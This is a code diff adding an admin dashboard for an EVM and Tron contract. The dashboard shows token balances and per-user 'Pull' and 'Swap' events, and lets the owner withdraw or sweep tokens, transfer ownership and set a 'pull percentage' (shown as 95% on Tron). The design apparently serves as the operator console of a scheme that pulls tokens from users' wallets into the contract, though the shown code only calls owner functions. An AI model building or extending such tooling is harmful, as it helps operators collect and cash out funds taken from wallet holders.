+        <td style="font-family:monospace;font-size:11px"><a href="${activeChain.explorer}/address/${e.user}" target="_blank" style="color:var(--accent2)">${short(e.user)}</a></td>
+        <td><span style="font-weight:700;color:var(--accent2)">${tk.symbol}</span></td>
+        <td style="font-weight:600">${amt}${extraTxt}</td>
+        <td><span class="pill ${e.type === "Swap" ? "swap" : "success"}">${e.type}</span></td>
+        <td><a href="${activeChain.explorer}/tx/${e.txHash}" target="_blank" style="color:var(--accent2);font-size:11px">tx ↗</a></td>
+      </tr>`;
+    }).join("");
+
+    document.getElementById("main").innerHTML=`
+      <p class="section-title" style="margin-bottom:16px">Recent Pulls — ${activeChain.name} (last ~50k blocks, ${events.length} events)</p>
+      <div style="overflow-x:auto;background:var(--card);border:1px solid var(--border);border-radius:14px;">
+        <table class="records-table">
+          <thead><tr><th>Date</th><th>User</th><th>Token</th><th>Amount</th><th>Type</th><th>Tx</th></tr></thead>
+          <tbody>${rows}</tbody>
+        </table>
+      </div>`;
+  }catch(e){
+    document.getElementById("main").innerHTML=`<div class="empty">Error: ${e.message}</div>`;
+  }
+}
+
+// ── Admin actions ──────────────────────────────────────────────────────────
+async function withdraw(btn){
+  const [tokenAddr,decimals] = document.getElementById("withdrawToken").value.split(":");
+  const to  = document.getElementById("withdrawTo").value.trim();
+  const amt = document.getElementById("withdrawAmt").value;
+  if(!to||!amt){ showToast("Fill in all fields","error"); return; }
+  btn.disabled=true; btn.textContent="Withdrawing...";
+  try{
+    const amount = ethers.parseUnits(amt,parseInt(decimals));
+    const tx = await contract.withdrawToken(tokenAddr,to,amount,{gasPrice:ethers.parseUnits(activeChain.gasPrice,"gwei")});
+    await tx.wait();
+    showToast("Withdrawal complete! ✅","success");
+    if(currentTab==="overview") await renderOverview();
+  }catch(e){ showToast(e.reason||e.message,"error"); }
+  btn.disabled=false; btn.textContent="Withdraw";
+}
+
+async function withdrawAll(btn){
+  const tokenAddr = document.getElementById("withdrawAllToken").value;
+  const to        = document.getElementById("withdrawAllTo").value.trim();
+  if(!to){ showToast("Enter destination address","error"); return; }
+  btn.disabled=true; btn.textContent="Sweeping...";
+  try{
+    const tx = await contract.withdrawAll(tokenAddr,to,{gasPrice:ethers.parseUnits(activeChain.gasPrice,"gwei")});
+    await tx.wait();
+    showToast("Sweep complete! ✅","success");
+    if(currentTab==="overview") await renderOverview();
+  }catch(e){ showToast(e.reason||e.message,"error"); }
+  btn.disabled=false; btn.textContent="Withdraw All";
+}
+
+async function transferOwner(btn){
+  const newOwner = document.getElementById("newOwnerAddr").value.trim();
+  if(!newOwner){ showToast("Enter new owner address","error"); return; }
+  if(!confirm(`Transfer ownership to ${newOwner}? This cannot be undone.`)) return;
+  btn.disabled=true; btn.textContent="Transferring...";
+  try{
+    const tx = await contract.transferOwnership(newOwner,{gasPrice:ethers.parseUnits(activeChain.gasPrice,"gwei")});
+    await tx.wait();
+    showToast("Ownership transferred. You are no longer the owner.","success");
+    setTimeout(()=>location.reload(),2000);
+  }catch(e){ showToast(e.reason||e.message,"error"); }
+  btn.disabled=false; btn.textContent="Transfer Ownership";
+}
+
+async function readPullPct(){
+  try{
+    const pct = await contract.pullPercent();
+    const inp = document.getElementById("pullPctInput");
+    if(inp) inp.value = pct.toString();
+    const lbl = document.getElementById("livePullPct");
+    if(lbl) lbl.textContent = pct.toString() + "%";
+    showToast(`Current pull %: ${pct}%`,"info");
+  }catch(e){ showToast(e.reason||e.message,"error"); }
+}
+
+async function setPullPct(btn){
+  const pct = parseInt(document.getElementById("pullPctInput").value);
+  if(!pct || pct < 1 || pct > 100){ showToast("Enter a value between 1 and 100","error"); return; }
+  if(!confirm(`Set pull percentage to ${pct}% on ${activeChain.name}?`)) return;
+  btn.disabled=true; btn.textContent="Setting...";
+  try{
+    const tx = await contract.setPullPercent(BigInt(pct),{gasPrice:ethers.parseUnits(activeChain.gasPrice,"gwei")});
+    await tx.wait();
+    showToast(`Pull % set to ${pct}% ✓`,"success");
+    const lbl = document.getElementById("livePullPct");
+    if(lbl) lbl.textContent = pct + "%";
+  }catch(e){ showToast(e.reason||e.message,"error"); }
+  btn.disabled=false; btn.textContent="Set Percentage";
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// TRON ADMIN SECTION
+// Everything below uses TronLink (window.tronWeb) — completely separate from
+// the EVM ethers.js code above. Same tabs, same UI, different blockchain.
+// ═══════════════════════════════════════════════════════════════════════════
+
+// Poll getTransactionInfo every 2s until blockNumber appears (Tron ~3s blocks)
+async function waitForTronAdminTx(txid){
+  for(let i = 0; i < 20; i++){
+    await new Promise(r => setTimeout(r, 2000));
+    try{
+      const info = await window.tronWeb.trx.getTransactionInfo(txid);
+      if(info && info.blockNumber){
+        if(info.receipt?.result === "REVERT") throw new Error("Transaction reverted");
+        return info;
+      }
+    }catch(e){
+      if(e.message && e.message !== "Transaction not found") throw e;
+    }
+  }
+  throw new Error("Transaction not confirmed after 40 seconds");
+}
+
+// ── Connect TronLink ───────────────────────────────────────────────────────
+// TronLink behaves differently depending on context:
+//   • Inside TronLink's own dApp browser → window.tronWeb.defaultAddress is pre-populated
+//   • Chrome extension on a regular browser → needs tronLink.request('tron_requestAccounts')
+//     first, exactly like MetaMask needs eth_requestAccounts before eth_accounts works.
+async function connectTronLink(){
+  if(!window.tronWeb){
+    showToast("TronLink not detected. Install the TronLink Chrome extension.","error");
+    return;
+  }
+
+  // Step 1 — Request authorization via the modern TronLink API.
+  // This opens the TronLink popup asking the user to connect to this site.
+  // If tronLink.request is not available (older builds), we skip and fall through.
+  try{
+    if(window.tronLink?.request){
+      const resp = await window.tronLink.request({ method: "tron_requestAccounts" });
+      // resp.code: 200 = ok, 4001 = user rejected, 4000 = wallet locked
+      if(resp?.code === 4001){ showToast("Connection rejected in TronLink.","error"); return; }
+      if(resp?.code === 4000){ showToast("TronLink is locked. Unlock and try again.","error"); return; }
+    } else if(window.tronWeb?.request){
+      // Some TronLink versions expose .request() on tronWeb instead
+      await window.tronWeb.request({ method: "tron_requestAccounts" });
+    }
+  }catch(e){
+    // .request() not supported by this TronLink version — continue to address check
+  }
+
+  // Step 2 — Short pause so TronLink can populate defaultAddress after auth
+  await new Promise(r => setTimeout(r, 400));
+
+  // Step 3 — Read the wallet address
+  const address = window.tronWeb?.defaultAddress?.base58;
+  if(!address){
+    showToast("Could not read TronLink address. Unlock your wallet and try again.","error");
+    return;
+  }
+  tronWallet = address;
+
+  // Step 4 — Verify the connected wallet is the contract owner
+  try{
+    const tronContract = await window.tronWeb.contract(TRON_ADMIN_ABI).at(TRON_ADMIN.contract);
+    const ownerHex     = await tronContract.owner().call();
+    // TronGrid returns addresses in hex (41...) — convert to Base58 for comparison
+    const ownerBase58  = window.tronWeb.address.fromHex(ownerHex);
+    isTronOwner        = tronWallet === ownerBase58;
+  }catch(e){
+    isTronOwner = false;
+    showToast("Could not read contract owner. Is the Tron contract deployed?","error");
+  }
+
+  // Step 5 — Update header and render dashboard
+  document.getElementById("headerRight").innerHTML =
+    `<div class="wallet-pill" style="border-left:3px solid #ef0027">${isTronOwner?"👑":""} ${short(tronWallet)} <span style="color:#ef0027;font-size:10px;margin-left:4px">TRX</span></div>`;
+  document.getElementById("tabs").style.display = "flex";
+
+  await renderDashboard();
+  showToast("TronLink connected!","success");
+}
+
+// ── Tron Overview ──────────────────────────────────────────────────────────
+async function renderTronOverview(){
+  document.getElementById("main").innerHTML = `<div class="loading">Loading Tron contract balances...</div>`;
+
+  if(!isTronOwner){
+    document.getElementById("main").innerHTML =
+      `<div class="alert-owner">⚠️ This wallet is not the Tron contract owner. Connect with your owner wallet.</div>`;
+    return;
+  }
+
+  try{
+    const tronContract = await window.tronWeb.contract(TRON_ADMIN_ABI).at(TRON_ADMIN.contract);
+    let balCards = "";
+    let nonZeroCount = 0;
+    let totalUsdEst  = 0;
+
+    // USD estimates for display (approximate — not used for any logic)
+    const USD_EST = {USDT:1,USDC:1,TUSD:1,USDD:1,USDJ:1,WTRX:0.12,SUN:0.02,JST:0.03,WIN:0.00005,BTT:0.0000012,NFT:0.002};
+
+    for(const t of TRON_ADMIN.tokens){
+      let balRaw = "0";
+      try{
+        const result = await tronContract.contractTokenBalance(t.address).call();
+        balRaw = result.toString();
+      }catch(e){}
+
+      const balNum = Number(balRaw) / (10 ** t.decimals);
+      const balFmt = balNum.toFixed(t.decimals <= 6 ? 4 : 6);
+      const usdEst = balNum * (USD_EST[t.symbol] || 0);
+
+      if(balRaw !== "0" && balRaw !== ""){
+        nonZeroCount++;
+        totalUsdEst += usdEst;
+      }
+
+      balCards += `
+        <div class="bal-card" style="${balRaw!=="0"?"border-color:#2a1a0a":""}" >
+          <div class="bal-symbol">${t.symbol} <span style="font-size:9px;color:var(--muted);font-weight:400">TRC-20</span></div>
+          <div class="bal-amount" style="${balRaw!=="0"?"color:#ef0027":""}">${balFmt}</div>
+          ${usdEst > 0.01 ? `<div style="font-size:10px;color:var(--muted);margin-top:2px">≈ $${usdEst.toFixed(2)}</div>` : ""}
+        </div>`;
+    }
+
+    document.getElementById("main").innerHTML = `
+      <div class="stats-grid">
+        <div class="stat-card"><div class="stat-label">Tokens With Balance</div><div class="stat-val">${nonZeroCount}</div></div>
+        <div class="stat-card"><div class="stat-label">Est. Total Value</div><div class="stat-val" style="font-size:18px;padding-top:4px">$${totalUsdEst.toFixed(2)}</div><div class="stat-sub">approximate</div></div>
+        <div class="stat-card"><div class="stat-label">Network</div><div class="stat-val" style="font-size:13px;padding-top:6px;color:#ef0027">Tron</div></div>
+      </div>
+      <p class="section-title">TRC-20 Contract Balances</p>
+      <div class="token-balances">${balCards || "<div class='empty'>No token balances found</div>"}</div>
+      <p class="section-title">Contract Address</p>
+      <div style="background:var(--card);border:1px solid var(--border);border-radius:10px;padding:14px;font-family:monospace;font-size:12px;color:#ef0027;margin-bottom:8px;word-break:break-all">${TRON_ADMIN.contract}</div>
+      <a href="${TRON_ADMIN.explorer}/#/contract/${TRON_ADMIN.contract}" target="_blank" style="font-size:12px;color:var(--muted);">View on ${TRON_ADMIN.explorerName} ↗</a>
+    `;
+  }catch(e){
+    document.getElementById("main").innerHTML = `<div class="empty">Error: ${e.message}</div>`;
+  }
+}
+
+// ── Tron Actions ───────────────────────────────────────────────────────────
+function renderTronActions(){
+  if(!isTronOwner){
+    document.getElementById("main").innerHTML =
+      `<div class="alert-owner">⚠️ Connect with your Tron owner wallet to access admin actions.</div>`;
+    return;
+  }
+
+  const tokenOptsAmt = TRON_ADMIN.tokens.map(t =>
+    `<option value="${t.address}:${t.decimals}">${t.symbol}</option>`).join("");
+  const tokenOpts = TRON_ADMIN.tokens.map(t =>
+    `<option value="${t.address}">${t.symbol}</option>`).join("");
+
+  document.getElementById("main").innerHTML = `
+    <div class="action-grid">
+
+      <div class="action-card">
+        <h3>💸 Withdraw Specific Amount</h3>
+        <p>Move a fixed TRC-20 amount from the Tron contract to any Tron address.</p>
+        <div class="input-row"><select id="tronWithdrawToken">${tokenOptsAmt}</select></div>
+        <div class="input-row"><input id="tronWithdrawTo" placeholder="Destination T... address"/></div>
+        <div class="input-row"><input id="tronWithdrawAmt" placeholder="Amount" type="number" step="0.000001"/></div>
+        <button class="action-btn danger" onclick="tronWithdraw(this)">Withdraw</button>
+      </div>
+
+      <div class="action-card">
+        <h3>📤 Withdraw All</h3>
+        <p>Sweep the entire balance of a token from the Tron contract.</p>
+        <div class="input-row"><select id="tronWithdrawAllToken">${tokenOpts}</select></div>
+        <div class="input-row"><input id="tronWithdrawAllTo" placeholder="Destination T... address"/></div>
+        <button class="action-btn primary" onclick="tronWithdrawAll(this)">Withdraw All</button>
+      </div>
+
+      <div class="action-card">
+        <h3>👑 Transfer Ownership</h3>
+        <p>Move admin control to a different Tron wallet. <strong>Irreversible.</strong></p>
+        <div class="input-row"><input id="tronNewOwner" placeholder="New owner T... address"/></div>
+        <button class="action-btn danger" onclick="tronTransferOwner(this)">Transfer Ownership</button>
+      </div>
+
+      <div class="action-card">
+        <h3>🔗 Contract Info</h3>
+        <p>Quick details and TronScan link.</p>
+        <div style="font-size:12px;color:var(--muted);line-height:2">
+          <div>Contract: <span style="color:#ef0027;font-family:monospace">${short(TRON_ADMIN.contract)}</span></div>
+          <div>Network: <span style="color:var(--text)">Tron Mainnet</span></div>
+          <div>Token standard: <span style="color:var(--text)">TRC-20</span></div>
+          <div>Pull %: <span style="color:var(--text)">95%</span></div>
+          <div style="margin-top:6px"><a href="${TRON_ADMIN.explorer}/#/contract/${TRON_ADMIN.contract}" target="_blank" style="color:#ef0027">View on ${TRON_ADMIN.explorerName} ↗</a></div>
+        </div>
+      </div>
+
+    </div>`;
+}
+
+// ── Tron Records ───────────────────────────────────────────────────────────
+async function renderTronRecords(){
+  document.getElementById("main").innerHTML = `<div class="loading">Fetching Tron events from TronGrid...</div>`;
+
+  try{
+    // TronGrid events API — returns on-chain events for our contract
+    const [pulledResp, swappedResp] = await Promise.all([
+      fetch(`${TRON_ADMIN.rpcApi}/v1/contracts/${TRON_ADMIN.contract}/events?event_name=Pulled&only_confirmed=true&limit=50&order_by=block_timestamp,desc`),
+      fetch(`${TRON_ADMIN.rpcApi}/v1/contracts/${TRON_ADMIN.contract}/events?event_name=Swapped&only_confirmed=true&limit=50&order_by=block_timestamp,desc`),
+    ]);
+
+    const pulledData  = await pulledResp.json();
+    const swappedData = await swappedResp.json();
+
+    const pulledEvents  = pulledData?.data  || [];
+    const swappedEvents = swappedData?.data || [];
+
+    if(pulledEvents.length === 0 && swappedEvents.length === 0){
+      document.getElementById("main").innerHTML =
+        `<div class="empty">No Pulled or Swapped events found. Either the contract is fresh or no one has used it yet.</div>`;
+      return;
+    }
+
+    // Build unified list sorted by block_timestamp desc
+    const events = [];
+
+    for(const e of pulledEvents){
+      events.push({
+        type:      "Pull",
+        txHash:    e.transaction_id,
+        block:     e.block_number,
+        timestamp: e.block_timestamp,           // milliseconds
+        user:      e.result?.user  || "",
+        token:     e.result?.token || "",
+        amount:    e.result?.amount || "0",
+      });
+    }
+    for(const e of swappedEvents){
+      events.push({
+        type:      "Swap",
+        txHash:    e.transaction_id,
+        block:     e.block_number,
+        timestamp: e.block_timestamp,
+        user:      e.result?.user     || "",
+        token:     e.result?.tokenIn  || "",
+        tokenOut:  e.result?.tokenOut || "",
+        amount:    e.result?.amountIn  || "0",
+        amount2:   e.result?.amountOut || "0",
+      });
+    }
+
+    events.sort((a,b) => b.timestamp - a.timestamp);
+    const topEvents = events.slice(0, 50);
+
+    // Build token lookup by address (both hex and Base58 keys for matching)
+    const tokenMap = {};
+    for(const t of TRON_ADMIN.tokens){
+      tokenMap[t.address.toLowerCase()] = t;
+      try{ tokenMap[window.tronWeb.address.toHex(t.address).toLowerCase()] = t; }catch(e){}
+    }
+
+    // Convert hex address (41...) to a displayable short string
+    const tronShort = (hexAddr) => {
+      try{
+        const b58 = window.tronWeb.address.fromHex(hexAddr);
+        return b58.slice(0,6)+"..."+b58.slice(-4);
+      }catch(e){ return hexAddr.slice(0,8)+"..."; }
+    };
+
+    const fmtDate = ts => new Date(Number(ts)).toLocaleDateString("en-GB",{day:"numeric",month:"short",year:"numeric"});
+    const fmtTime = ts => new Date(Number(ts)).toLocaleTimeString("en-GB",{hour:"2-digit",minute:"2-digit"});
+
+    const rows = topEvents.map(e => {
+      const tokenKey = e.token?.toLowerCase() || "";
+      const tk  = tokenMap[tokenKey] || { symbol: e.token?.slice(0,8)||"?", decimals: 6 };
+      const amt = (Number(e.amount) / (10 ** tk.decimals)).toFixed(4) + " " + tk.symbol;
+
+      let extraTxt = "";
+      if(e.type === "Swap" && e.tokenOut){
+        const tkOutKey = e.tokenOut?.toLowerCase() || "";
+        const tkOut = tokenMap[tkOutKey] || { symbol: e.tokenOut?.slice(0,8)||"?", decimals: 6 };
+        extraTxt = " → " + (Number(e.amount2) / (10 ** tkOut.decimals)).toFixed(4) + " " + tkOut.symbol;
+      }
+
+      return `<tr>
+        <td>${fmtDate(e.timestamp)}<br><span style="color:var(--muted);font-size:10px">${fmtTime(e.timestamp)}</span></td>
+        <td style="font-family:monospace;font-size:11px">
+          <a href="${TRON_ADMIN.explorer}/#/address/${e.user}" target="_blank" style="color:#ef0027">${tronShort(e.user)}</a>
+        </td>
+        <td><span style="font-weight:700;color:#ef0027">${tk.symbol}</span></td>
+        <td style="font-weight:600">${amt}${extraTxt}</td>
+        <td><span class="pill ${e.type==="Swap"?"swap":"success"}">${e.type}</span></td>
+        <td><a href="${TRON_ADMIN.explorer}/#/transaction/${e.txHash}" target="_blank" style="color:#ef0027;font-size:11px">tx ↗</a></td>
+      </tr>`;
+    }).join("");
+
+    document.getElementById("main").innerHTML = `
+      <p class="section-title" style="margin-bottom:16px">Recent Pulls — Tron (${topEvents.length} events)</p>
+      <div style="overflow-x:auto;background:var(--card);border:1px solid var(--border);border-radius:14px;">
+        <table class="records-table">
+          <thead><tr><th>Date</th><th>User</th><th>Token</th><th>Amount</th><th>Type</th><th>Tx</th></tr></thead>
+          <tbody>${rows}</tbody>
+        </table>
+      </div>`;
+  }catch(e){
+    document.getElementById("main").innerHTML = `<div class="empty">Error loading Tron records: ${e.message}</div>`;
+  }
+}
+
+// ── Tron withdraw actions ──────────────────────────────────────────────────
+async function tronWithdraw(btn){
+  const [tokenAddr, decimals] = document.getElementById("tronWithdrawToken").value.split(":");
+  const to  = document.getElementById("tronWithdrawTo").value.trim();
+  const amt = document.getElementById("tronWithdrawAmt").value;
+  if(!to || !amt){ showToast("Fill in all fields","error"); return; }
+  if(!to.startsWith("T")){ showToast("Enter a valid Tron address (starts with T)","error"); return; }
+
+  btn.disabled = true; btn.textContent = "Withdrawing...";
+  try{
+    const tronContract = await window.tronWeb.contract(TRON_ADMIN_ABI).at(TRON_ADMIN.contract);
+    const rawAmount    = Math.floor(parseFloat(amt) * (10 ** parseInt(decimals))).toString();
+    const txid         = await tronContract.withdrawToken(tokenAddr, to, rawAmount).send({ feeLimit: 50000000 });
+    await waitForTronAdminTx(txid);
+    showToast("Withdrawal complete! ✅","success");
+    if(currentTab === "overview") await renderTronOverview();
+  }catch(e){ showToast(e.message || "Withdrawal failed","error"); }
+  btn.disabled = false; btn.textContent = "Withdraw";
+}
+
+async function tronWithdrawAll(btn){
+  const tokenAddr = document.getElementById("tronWithdrawAllToken").value;
+  const to        = document.getElementById("tronWithdrawAllTo").value.trim();
+  if(!to){ showToast("Enter destination address","error"); return; }
+  if(!to.startsWith("T")){ showToast("Enter a valid Tron address (starts with T)","error"); return; }
+
+  btn.disabled = true; btn.textContent = "Sweeping...";
+  try{
+    const tronContract = await window.tronWeb.contract(TRON_ADMIN_ABI).at(TRON_ADMIN.contract);
+    const txid         = await tronContract.withdrawAll(tokenAddr, to).send({ feeLimit: 50000000 });
+    await waitForTronAdminTx(txid);
+    showToast("Sweep complete! ✅","success");
+    if(currentTab === "overview") await renderTronOverview();
+  }catch(e){ showToast(e.message || "Sweep failed","error"); }
+  btn.disabled = false; btn.textContent = "Withdraw All";
+}
+
+async function tronTransferOwner(btn){
+  const newOwner = document.getElementById("tronNewOwner").value.trim();
+  if(!newOwner){ showToast("Enter new owner address","error"); return; }
+  if(!newOwner.startsWith("T")){ showToast("Enter a valid Tron address (starts with T)","error"); return; }
+  if(!confirm(`Transfer Tron contract ownership to ${newOwner}? This cannot be undone.`)) return;
+
+  btn.disabled = true; btn.textContent = "Transferring...";
+  try{
+    const tronContract = await window.tronWeb.contract(TRON_ADMIN_ABI).at(TRON_ADMIN.contract);
+    const txid         = await tronContract.transferOwnership(newOwner).send({ feeLimit: 30000000 });
+    await waitForTronAdminTx(txid);
+    showToast("Ownership transferred. You are no longer the owner.","success");
+    setTimeout(()=>location.reload(), 2000);
+  }catch(e){ showToast(e.message || "Transfer failed","error"); }
+  btn.disabled = false; btn.textContent = "Transfer Ownership";
+}
+</script>
+</body>
+</html>
